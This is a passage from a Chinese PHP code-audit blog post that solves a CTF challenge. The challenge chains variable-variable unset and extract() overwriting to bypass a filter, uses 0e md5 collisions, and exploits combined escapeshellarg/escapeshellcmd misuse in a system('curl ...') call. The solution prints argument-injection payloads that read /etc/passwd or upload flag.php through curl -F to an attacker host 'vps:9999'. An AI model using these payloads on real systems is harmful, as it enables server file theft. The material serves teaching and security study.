<h3 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h3><p>看完了上述分析，不知道大家是否对 <strong>escapeshellarg()</strong> 和 <strong>escapeshellcmd()</strong> 两个函数一起使用所产生的问题，有了更加深入的理解，文中用到的代码可以从 <a target="_blank" rel="noopener" href="https://github.com/PHPMailer/PHPMailer">这里</a> 下载，当然文中若有不当之处，还望各位斧正。如果你对我们的项目感兴趣，欢迎发送邮件到 <strong><a href="mailto:&#104;&#x6f;&#110;&#103;&#x72;&#x69;&#115;&#x65;&#x63;&#x40;&#103;&#x6d;&#97;&#x69;&#108;&#x2e;&#99;&#x6f;&#109;">&#104;&#x6f;&#110;&#103;&#x72;&#x69;&#115;&#x65;&#x63;&#x40;&#103;&#x6d;&#97;&#x69;&#108;&#x2e;&#99;&#x6f;&#109;</a></strong> 联系我们。<strong>Day5</strong> 的分析文章就到这里，我们最后留了一道CTF题目给大家练手，题目如下：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//index.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="string">&#x27;index.php&#x27;</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">waf</span>(<span class="params"><span class="variable">$a</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">foreach</span>(<span class="variable">$a</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>)&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/flag/i&#x27;</span>,<span class="variable">$key</span>))&#123;</span><br><span class="line">            <span class="keyword">exit</span>(<span class="string">&#x27;are you a hacker&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">foreach</span>(<span class="keyword">array</span>(<span class="string">&#x27;_POST&#x27;</span>, <span class="string">&#x27;_GET&#x27;</span>, <span class="string">&#x27;_COOKIE&#x27;</span>) <span class="keyword">as</span> <span class="variable">$__R</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$$__R</span>) &#123; </span><br><span class="line">        <span class="keyword">foreach</span>(<span class="variable">$$__R</span> <span class="keyword">as</span> <span class="variable">$__k</span> =&gt; <span class="variable">$__v</span>) &#123; </span><br><span class="line">            <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$$__k</span>) &amp;&amp; <span class="variable">$$__k</span> == <span class="variable">$__v</span>) <span class="keyword">unset</span>(<span class="variable">$$__k</span>); </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_POST</span>) &#123; <span class="title function_ invoke__">waf</span>(<span class="variable">$_POST</span>);&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_GET</span>) &#123; <span class="title function_ invoke__">waf</span>(<span class="variable">$_GET</span>); &#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_COOKIE</span>) &#123; <span class="title function_ invoke__">waf</span>(<span class="variable">$_COOKIE</span>);&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_POST</span>) <span class="title function_ invoke__">extract</span>(<span class="variable">$_POST</span>, EXTR_SKIP);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_GET</span>) <span class="title function_ invoke__">extract</span>(<span class="variable">$_GET</span>, EXTR_SKIP);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;flag&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;flag&#x27;</span>] === <span class="variable">$_GET</span>[<span class="string">&#x27;hongri&#x27;</span>])&#123;</span><br><span class="line">        <span class="keyword">exit</span>(<span class="string">&#x27;error&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;flag&#x27;</span>] ) == <span class="title function_ invoke__">md5</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;hongri&#x27;</span>]))&#123;</span><br><span class="line">        <span class="variable">$url</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line">        <span class="variable">$urlInfo</span> = <span class="title function_ invoke__">parse_url</span>(<span class="variable">$url</span>);</span><br><span class="line">        <span class="keyword">if</span>(!(<span class="string">&quot;http&quot;</span> === <span class="title function_ invoke__">strtolower</span>(<span class="variable">$urlInfo</span>[<span class="string">&quot;scheme&quot;</span>]) || <span class="string">&quot;https&quot;</span>===<span class="title function_ invoke__">strtolower</span>(<span class="variable">$urlInfo</span>[<span class="string">&quot;scheme&quot;</span>])))&#123;</span><br><span class="line">            <span class="keyword">die</span>( <span class="string">&quot;scheme error!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$url</span> = <span class="title function_ invoke__">escapeshellarg</span>(<span class="variable">$url</span>);</span><br><span class="line">        <span class="variable">$url</span> = <span class="title function_ invoke__">escapeshellcmd</span>(<span class="variable">$url</span>);</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="string">&quot;curl &quot;</span>.<span class="variable">$url</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>这道题主要考察全局变量覆盖，结合 unset 函数绕过waf，以及通过 curl 读取文件，接下来我们将代码分为两个部分看看吧。我们看到 第11行-14行 有这样一串代码：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">foreach</span>(<span class="keyword">array</span>(<span class="string">&#x27;_POST&#x27;</span>, <span class="string">&#x27;_GET&#x27;</span>, <span class="string">&#x27;_COOKIE&#x27;</span>) <span class="keyword">as</span> <span class="variable">$__R</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$$__R</span>) &#123; </span><br><span class="line">        <span class="keyword">foreach</span>(<span class="variable">$$__R</span> <span class="keyword">as</span> <span class="variable">$__k</span> =&gt; <span class="variable">$__v</span>) &#123; </span><br><span class="line">            <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$$__k</span>) &amp;&amp; <span class="variable">$$__k</span> == <span class="variable">$__v</span>) <span class="keyword">unset</span>(<span class="variable">$$__k</span>); </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>分析一下这串代码的逻辑：<br>首先 第一行 ，循环获取字符串 GET、POST、COOKIE ，并依次赋值给变量 $__R 。在 第二行 中先判断 $$__R 变量是否存在数据，如果存在，则继续判断超全局数组 GET、POST、COOKIE 中是否存在键值相等的，如果存在，则删除该变量。这里有个 可变变量 的概念需要先理解一下。可变变量指的是：一个变量的变量名可以动态的设置和使用。一个可变变量获取了一个普通变量的值作为其变量名。<br><img src="/2024/10/10/WebSecurity/codeaudit/phpaudit2/image-18.png"></p>
<p>这里使用 <strong>$$</strong> 将通过 <strong>变量a</strong> 获取到的数据，注册成为一个<strong>新的变量</strong>（这里是 <strong>变量hello</strong> ）。然后会发现变量 <strong>$$a</strong> 的输出数据和变量 <strong>$hello</strong>  的输出数据一致（如上图，输出为 <strong>world</strong> ）。</p>
<p>我通过 <strong>GET</strong> 请求向 <strong>index.php</strong> 提交 <strong>flag&#x3D;test</strong> ，接着通过 <strong>POST</strong> 请求提交 <strong>_GET[flag]&#x3D;test</strong> 。当开始遍历 <strong>$_POST</strong> 超全局数组的时候， <strong>$__k</strong> 代表 <strong>_GET[flag]</strong> ，所以 <strong>$$__k</strong> 就是 <strong>$_GET[flag]</strong> ，即 <strong>test</strong> 值，此时 <strong>$$__k</strong> &#x3D;&#x3D; <strong>$__v</strong> 成立，变量 <strong>$_GET[flag]</strong> 就被 <strong>unset</strong> 了。但是在 <strong>第21行</strong> 和 <strong>22行</strong> 有这样一串代码：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="variable">$_POST</span>) <span class="title function_ invoke__">extract</span>(<span class="variable">$_POST</span>, EXTR_SKIP);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_GET</span>) <span class="title function_ invoke__">extract</span>(<span class="variable">$_GET</span>, EXTR_SKIP);</span><br></pre></td></tr></table></figure>

<p> <strong>extract</strong> 函数的作用是将对象内的键名变成一个变量名，而这个变量对应的值就是这个键名的值， <strong>EXTR_SKIP</strong> 参数表示如果前面存在此变量，不对前面的变量进行覆盖处理。由于我们前面通过 <strong>POST</strong> 请求提交 <strong>_GET[flag]&#x3D;test</strong> ，所以这里会变成 <strong>$_GET[flag]&#x3D;test</strong> ，这里的 <strong>$_GET</strong> 变量就不需要再经过 <strong>waf</strong> 函数检测了，也就绕过了 <strong>preg_match(‘&#x2F;flag&#x2F;i’,$key)</strong> 的限制。下面举个 <strong>extract</strong> 函数用例：</p>
<p><img src="/2024/10/10/WebSecurity/codeaudit/phpaudit2/image-19.png"></p>
<p>接着到了24行比较两个变量的md5值，我们构造出2个0e开头的md5即可绕过，这样就进入第二阶段。</p>
<p>第二阶段主要考察 <strong>curl</strong> 读取文件。这里主要加了两个坑，我们之前说过的两个函数 <strong>escapeshellarg()</strong> 和 <strong>escapeshellcmd()</strong> 一起使用的时候会造成的问题，主要看看这部分代码。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;flag&#x27;</span>] ) == <span class="title function_ invoke__">md5</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;hongri&#x27;</span>]))&#123;</span><br><span class="line">        <span class="variable">$url</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line">        <span class="variable">$urlInfo</span> = <span class="title function_ invoke__">parse_url</span>(<span class="variable">$url</span>);</span><br><span class="line">        <span class="keyword">if</span>(!(<span class="string">&quot;http&quot;</span> === <span class="title function_ invoke__">strtolower</span>(<span class="variable">$urlInfo</span>[<span class="string">&quot;scheme&quot;</span>]) || <span class="string">&quot;https&quot;</span>===<span class="title function_ invoke__">strtolower</span>(<span class="variable">$urlInfo</span>[<span class="string">&quot;scheme&quot;</span>])))&#123;</span><br><span class="line">            <span class="keyword">die</span>( <span class="string">&quot;scheme error!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$url</span> = <span class="title function_ invoke__">escapeshellarg</span>(<span class="variable">$url</span>);</span><br><span class="line">        <span class="variable">$url</span> = <span class="title function_ invoke__">escapeshellcmd</span>(<span class="variable">$url</span>);</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="string">&quot;curl &quot;</span>.<span class="variable">$url</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>这里的 <strong>第8行</strong> 和 <strong>第9行</strong> 增加了两个过滤。</p>
<ul>
<li><strong>escapeshellarg</strong> ，将给字符串增加一个单引号并且能引用或者转码任何已经存在的单引号</li>
<li><strong>escapeshellcmd</strong> ，会对以下的字符进行转义&amp;#;<code>|*?~&lt;&gt;^()[]&#123;&#125;$</code>, <code>x0A</code> 和 <code>xFF</code>, <code>&#39;</code> 和 <code>&quot;</code>仅在不配对儿的时候被转义。</li>
</ul>
<p><img src="/2024/10/10/WebSecurity/codeaudit/phpaudit2/image-20.png"></p>
<p>在字符串增加了引号同时会进行转义，那么之前的payload</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/index1.php?url=http://127.0.0.1 -T /etc/passwd</span><br></pre></td></tr></table></figure>

<p>因为增加了 <strong>‘</strong> 进行了转义，所以整个字符串会被当成参数。注意 <strong>escapeshellcmd</strong> 的问题是在于如果 <strong>‘</strong> 和 <strong>“</strong> 仅在不配对儿的时候被转义。那么如果我们多增加一个 <strong>‘</strong> 就可以扰乱之前的转义了。如下：<br><img src="/2024/10/10/WebSecurity/codeaudit/phpaudit2/image-21.png"></p>
<p>在 <strong>curl</strong> 中存在 <strong>-F</strong> 提交表单的方法，也可以提交文件。 <strong>-F &lt;key&#x3D;value&gt;</strong> 向服务器POST表单，例如： <strong>curl -F “web&#x3D;@index.html;type&#x3D;text&#x2F;html” url.com</strong> 。提交文件之后，利用代理的方式进行监听，这样就可以截获到文件了,同时还不受最后的的影响。那么最后的payload为：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://baidu.com/&#x27; -F file=@/etc/passwd -x  vps:9999</span><br></pre></td></tr></table></figure>
<p><img src="/2024/10/10/WebSecurity/codeaudit/phpaudit2/image-22.png"></p>
<p>这里应该是和 <strong>curl</strong> 版本有关系，我在 **7.54.0 ** 下没有测试成功。<br><img src="/2024/10/10/WebSecurity/codeaudit/phpaudit2/image-23.png"></p>
<p>题目中的 <strong>curl</strong> 版本是 <strong>7.19.7</strong><br><img src="/2024/10/10/WebSecurity/codeaudit/phpaudit2/image-24.png"></p>
<p>根据猜测，可能在是新版本中，先会执行 <strong>curl http</strong> 的操作，但是由于在后面增加了,例如 <strong><a target="_blank" rel="noopener" href="http://127.0.0.1,/">http://127.0.0.1，</a></strong> 但是curl无法找到这样的文件，出现404。出现404之后，后面的提交文件的操作就不进行了，程序就退出了。这样在vps上面就无法接受到文件了。</p>
<h3 id="解题payload："><a href="#解题payload：" class="headerlink" title="解题payload："></a>解题payload：</h3><p>所以这题最后的 <strong>payload</strong> 是这样的。</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/index.php?flag=QNKCDZO&amp;hongri=s878926199a&amp;url=http://baidu.com/&#x27;</span> -<span class="keyword">F</span> <span class="string">file=@/var/www/html/flag.php</span> -x <span class="string"></span> vps:9999 <span class="string">HTTP/1.1</span></span><br><span class="line"><span class="string">Host:</span> 127.0.0.1</span><br><span class="line"><span class="attribute">Cache-Control</span><span class="punctuation">: </span>max-age=0</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.86 Safari/537.36</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.8</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>PHPSESSID=om11lglr53tm1htliteav4uhk4</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>112</span><br><span class="line"></span><br><span class="line"><span class="language-sqf"><span class="variable">_GET</span>[<span class="built_in">flag</span>]=QNKCDZO&amp;<span class="variable">_GET</span>[hongri]=s878926199a&amp;<span class="variable">_GET</span>[url]=http:<span class="comment">//baidu.com/&#x27; -F file=@/var/www/html/flag.php -x  vps:9999</span></span></span><br></pre></td></tr></table></figure>

<p><a target="_blank" rel="noopener" href="https://lorexxar.cn/2016/12/28/cve-2016-10030/">phpmailer RCE漏洞分析</a><br><a target="_blank" rel="noopener" href="https://paper.seebug.org/164/">PHP escapeshellarg()+escapeshellcmd() 之殇</a><br><a target="_blank" rel="noopener" href="https://blog.chaitin.cn/phpmailer-cve-2016-10033/">PHPMailer 命令执行漏洞（CVE-2016-10033）分析</a></p>

  </div>
</article>


    <div class="blog-post-comments">
        <div id="utterances_thread">
            <noscript>Please enable JavaScript to view the comments.</noscript>
        </div>
    </div>


        
          <div id="footer-post-container">
  <div id="footer-post">

    <div id="nav-footer" style="display: none">
      <ul>
        
          <li><a href="/">Home</a></li>
        
          <li><a href="/about/">About</a></li>
        
          <li><a href="/archives/">Writing</a></li>
        
          <li><a href="/search/">Search</a></li>
        
          <li><a href="/categories/">Categories</a></li>
        
          <li><a href="/idea/">Idea</a></li>
        
          <li><a target="_blank" rel="noopener" href="https://github.com/g0dam">Projects</a></li>
        
      </ul>
    </div>

    
    
      <div id="toc-footer" style="display: none">
        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#postcard"><span class="toc-number">1.</span> <span class="toc-text">postcard</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%9E%E4%BE%8B%E5%88%86%E6%9E%90"><span class="toc-number">1.1.</span> <span class="toc-text">实例分析</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#CVE-2016-10045"><span class="toc-number">1.1.1.</span> <span class="toc-text">CVE-2016-10045</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#CVE-2016-10045-1"><span class="toc-number">1.1.2.</span> <span class="toc-text">CVE-2016-10045</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BF%AE%E5%A4%8D%E5%BB%BA%E8%AE%AE"><span class="toc-number">1.2.</span> <span class="toc-text">修复建议</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE"><span class="toc-number">1.3.</span> <span class="toc-text">题目</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%A7%A3%E9%A2%98payload%EF%BC%9A"><span class="toc-number">1.4.</span> <span class="toc-text">解题payload：</span></a></li></ol></li></ol>
      </div>
    

    <div id="share-footer" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://g0dam.github.io/2024/10/10/WebSecurity/codeaudit/phpaudit2/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://g0dam.github.io/2024/10/10/WebSecurity/codeaudit/phpaudit2/&text=【代码审计】PHP代码审计2"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://g0dam.github.io/2024/10/10/WebSecurity/codeaudit/phpaudit2/&title=【代码审计】PHP代码审计2"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://g0dam.github.io/2024/10/10/WebSecurity/codeaudit/phpaudit2/&is_video=false&description=【代码审计】PHP代码审计2"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=【代码审计】PHP代码审计2&body=Check out this article: https://g0dam.github.io/2024/10/10/WebSecurity/codeaudit/phpaudit2/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://g0dam.github.io/2024/10/10/WebSecurity/codeaudit/phpaudit2/&title=【代码审计】PHP代码审计2"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://g0dam.github.io/2024/10/10/WebSecurity/codeaudit/phpaudit2/&title=【代码审计】PHP代码审计2"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://g0dam.github.io/2024/10/10/WebSecurity/codeaudit/phpaudit2/&title=【代码审计】PHP代码审计2"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://g0dam.github.io/2024/10/10/WebSecurity/codeaudit/phpaudit2/&title=【代码审计】PHP代码审计2"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://g0dam.github.io/2024/10/10/WebSecurity/codeaudit/phpaudit2/&name=【代码审计】PHP代码审计2&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://g0dam.github.io/2024/10/10/WebSecurity/codeaudit/phpaudit2/&t=【代码审计】PHP代码审计2"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
</ul>

    </div>

    <div id="actions-footer">
        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
        
          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
        
        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
    </div>

  </div>
</div>

        
        <footer id="footer">
  <div class="footer-left">
    Copyright &copy;
    
    
    2024
    g0dam
  </div>
  <div class="footer-right">
    <nav>
      <ul>
        <!--
       --><li><a href="/">Home</a></li><!--
     --><!--
       --><li><a href="/about/">About</a></li><!--
     --><!--
       --><li><a href="/archives/">Writing</a></li><!--
     --><!--
       --><li><a href="/search/">Search</a></li><!--
     --><!--
       --><li><a href="/categories/">Categories</a></li><!--
     --><!--
       --><li><a href="/idea/">Idea</a></li><!--
     --><!--
       --><li><a target="_blank" rel="noopener" href="https://github.com/g0dam">Projects</a></li><!--
     -->
      </ul>
    </nav>
  </div>
</footer>

    </div>
    <!-- styles -->



  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>


    <!-- jquery -->

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>




<!-- clipboard -->

  
    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
  
  <script type="text/javascript">
  $(function() {
    // copy-btn HTML
    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
    btn += '<i class="fa-regular fa-clone"></i>';
    btn += '</span>';
    // mount it!
    $(".highlight table").before(btn);
    var clip = new ClipboardJS('.btn-copy', {
      text: function(trigger) {
        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
      }
    });
    clip.on('success', function(e) {
      e.trigger.setAttribute('aria-label', "Copied!");
      e.clearSelection();
    })
  })
  </script>


<script src="/js/main.js"></script>

<!-- search -->

<!-- Baidu Analytics -->

<!-- Cloudflare Analytics -->

<!-- Disqus Comments -->

<!-- utterances Comments -->

    <script type="text/javascript">
      var utterances_repo = 'owner/githubrepo';
      var utterances_issue_term = 'pathname';
      var utterances_label = 'Comment';
      var utterances_theme = 'github-dark';

      (function(){
          var script = document.createElement('script');

          script.src = 'https://utteranc.es/client.js';
          script.setAttribute('repo', utterances_repo);
          script.setAttribute('issue-term', 'pathname');
          script.setAttribute('label', utterances_label);
          script.setAttribute('theme', utterances_theme);
          script.setAttribute('crossorigin', 'anonymous');
          script.async = true;
          (document.getElementById('utterances_thread')).appendChild(script);
      }());
  </script>

</body>
</html>
